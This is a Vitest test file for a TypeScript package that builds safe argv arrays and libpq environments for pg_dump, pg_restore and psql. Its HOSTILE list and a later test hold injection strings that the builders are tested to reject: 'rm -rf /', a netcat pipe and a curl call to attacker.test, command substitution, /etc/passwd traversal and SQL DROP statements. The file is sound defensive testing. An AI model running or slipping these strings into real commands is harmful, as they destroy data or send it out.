/**
 * The argv builders are the one place in this package where a hostile string
 * could become a command. These tests are the proof that it cannot.
 */
import { describe, expect, it } from "vitest";

import {
	assertArgvSafe,
	buildLibpqEnvironment,
	buildLogicalCopyPlan,
	buildPgDumpArgv,
	buildPgRestoreArgv,
	buildPsqlArgv,
	type PostgresTargetInput,
	parsePostgresTarget,
} from "../src/index.js";

const target: PostgresTargetInput = {
	host: "db.example.test",
	port: 5432,
	database: "postgres",
	username: "app_role",
	sslMode: "require",
};

/** One entry per class of injection the builders must refuse. */
const HOSTILE = [
	["semicolon", "x; rm -rf /"],
	["backtick", "x`whoami`"],
	["command-substitution", "x$(id)"],
	["newline", "x\nDROP DATABASE prod"],
	["carriage-return", "x\rDROP DATABASE prod"],
	["pipe", "x | nc attacker.test 9000"],
	["ampersand", "x && curl attacker.test"],
	["glob", "x*"],
	["traversal", "../../etc/passwd"],
	["nul", "x\u0000y"],
	["leading-dash", "--file=/etc/passwd"],
	["whitespace", "two words"],
] as const;

describe("pg_dump / pg_restore argv", () => {
	it("returns an array, never a joined command line", () => {
		const argv = buildPgDumpArgv({
			target,
			filePath: "/tmp/dump.pgc",
			format: "custom",
		});
		expect(Array.isArray(argv)).toBe(true);
		expect(argv).toEqual([
			"pg_dump",
			"--host=db.example.test",
			"--port=5432",
			"--username=app_role",
			"--dbname=postgres",
			"--no-password",
			"--format=custom",
			"--file=/tmp/dump.pgc",
		]);
	});

	it("uses fused --flag=value form so no value can be re-read as a flag", () => {
		const argv = buildPgRestoreArgv({
			target,
			filePath: "/tmp/dump.pgc",
			noOwner: true,
		});
		const separated = argv.filter(
			(element) => element === "--host" || element === "--dbname",
		);
		expect(separated).toHaveLength(0);
		expect(argv.at(-1)).toBe("/tmp/dump.pgc");
	});

	it("never places a connection URI in argv", () => {
		for (const argv of [
			buildPgDumpArgv({ target, filePath: "/tmp/d.pgc", format: "custom" }),
			buildPgRestoreArgv({ target, filePath: "/tmp/d.pgc" }),
			buildPsqlArgv(target),
		]) {
			expect(argv.join(" ")).not.toMatch(/postgres(ql)?:\/\//iu);
			// `--no-password` is the point; a `password=<value>` never is.
			expect(argv.filter((element) => /password[=:]/iu.test(element))).toEqual(
				[],
			);
			expect(argv).toContain("--no-password");
		}
	});

	it("refuses credential-shaped material handed to it directly", () => {
		expect(() =>
			assertArgvSafe(["pg_dump", "--dbname=postgresql://u:p@h:5432/db"]),
		).toThrow(/credential-shaped/u);
	});

	for (const [name, hostile] of HOSTILE) {
		it(`rejects a ${name} in the database name`, () => {
			expect(() =>
				buildPgDumpArgv({
					target: { ...target, database: hostile },
					filePath: "/tmp/d.pgc",
					format: "custom",
				}),
			).toThrow();
		});

		it(`rejects a ${name} in the host`, () => {
			expect(() =>
				buildPgDumpArgv({
					target: { ...target, host: hostile },
					filePath: "/tmp/d.pgc",
					format: "custom",
				}),
			).toThrow();
		});

		it(`rejects a ${name} in the role name`, () => {
			expect(() =>
				buildPgRestoreArgv({
					target: { ...target, username: hostile },
					filePath: "/tmp/d.pgc",
				}),
			).toThrow();
		});
	}

	for (const control of ["\u0000", "\t", "\n", "\r", "\u001f", "\u007f"]) {
		it(`rejects control character ${JSON.stringify(control)} in a dump path`, () => {
			expect(() =>
				buildPgDumpArgv({
					target,
					filePath: `/tmp/dump${control}.pgc`,
					format: "custom",
				}),
			).toThrow(/control character/u);
		});
	}

	it("rejects NUL and newlines in directly supplied argv", () => {
		for (const control of ["\u0000", "\n", "\r"]) {
			expect(() => assertArgvSafe(["pg_dump", `dump${control}.pgc`])).toThrow(
				/NUL or newline/u,
			);
		}
	});

	it("accepts normal paths and argv", () => {
		const argv = buildPgDumpArgv({
			target,
			filePath: "/tmp/normal dump.pgc",
			format: "custom",
		});
		expect(argv).toContain("--file=/tmp/normal dump.pgc");
		expect(assertArgvSafe(argv)).toBe(argv);
	});

	it("rejects a dump path that escapes its directory", () => {
		expect(() =>
			buildPgDumpArgv({
				target,
				filePath: "/var/hobo/../../etc/passwd",
				format: "custom",
			}),
		).toThrow(/parent-directory traversal/u);
	});

	it("rejects a dump path that would be read as a flag", () => {
		expect(() =>
			buildPgDumpArgv({
				target,
				filePath: "--file=/etc/passwd",
				format: "custom",
			}),
		).toThrow(/read as a flag/u);
	});

	it("rejects an out-of-range port", () => {
		expect(() => parsePostgresTarget({ ...target, port: 70_000 })).toThrow(
			/between 1 and 65535/u,
		);
		expect(() => parsePostgresTarget({ ...target, port: 5432.5 })).toThrow(
			/integer/u,
		);
	});

	it("refuses a dump that is both schema-only and data-only", () => {
		expect(() =>
			buildPgDumpArgv({
				target,
				filePath: "/tmp/d.pgc",
				format: "custom",
				schemaOnly: true,
				dataOnly: true,
			}),
		).toThrow(/schema-only and data-only/u);
	});
});

describe("libpq credential channel", () => {
	it("carries the password in the environment, never in argv", () => {
		const env = buildLibpqEnvironment(target, {
			kind: "environment",
			password: "s3cret-value",
		});
		expect(env.PGPASSWORD).toBe("s3cret-value");
		expect(env.PGSSLMODE).toBe("require");
		const argv = buildPgDumpArgv({
			target,
			filePath: "/tmp/d.pgc",
			format: "custom",
		});
		expect(argv.some((element) => element.includes("s3cret-value"))).toBe(
			false,
		);
	});

	it("supports a passfile locator so the value stays out of the environment too", () => {
		const env = buildLibpqEnvironment(target, {
			kind: "passfile",
			path: "/proc/self/fd/7",
		});
		expect(env.PGPASSFILE).toBe("/proc/self/fd/7");
		expect(env.PGPASSWORD).toBeUndefined();
	});

	it("returns a frozen, complete environment so nothing ambient leaks in", () => {
		const env = buildLibpqEnvironment(target, {
			kind: "environment",
			password: "x",
		});
		expect(Object.isFrozen(env)).toBe(true);
		expect(Object.keys(env).sort()).toEqual([
			"PGCONNECT_TIMEOUT",
			"PGDATABASE",
			"PGHOST",
			"PGPASSWORD",
			"PGPORT",
			"PGSSLMODE",
			"PGUSER",
		]);
	});
});

describe("logical copy plan", () => {
	it("refuses to plan when the source has no logical replication", () => {
		expect(() =>
			buildLogicalCopyPlan({
				publicationName: "hobo_pub",
				subscriptionName: "hobo_sub",
				logicalReplicationEnabled: false,
			}),
		).toThrow(/logical replication enabled/u);
	});

	it("emits only the source side, because the destination statement embeds a DSN", () => {
		const plan = buildLogicalCopyPlan({
			publicationName: "hobo_pub",
			subscriptionName: "hobo_sub",
			tables: ["orders", "customers"],
			logicalReplicationEnabled: true,
		});
		expect(plan.sourceStatements).toEqual([
			"CREATE PUBLICATION hobo_pub FOR TABLE customers, orders;",
		]);
		expect(plan.destinationStatementsRequireDsn).toBe(true);
	});

	it("rejects a publication name that is not a plain SQL identifier", () => {
		expect(() =>
			buildLogicalCopyPlan({
				publicationName: 'pub"; DROP TABLE users; --',
				subscriptionName: "hobo_sub",
				logicalReplicationEnabled: true,
			}),
		).toThrow(/plain lowercase SQL identifiers/u);
	});
});
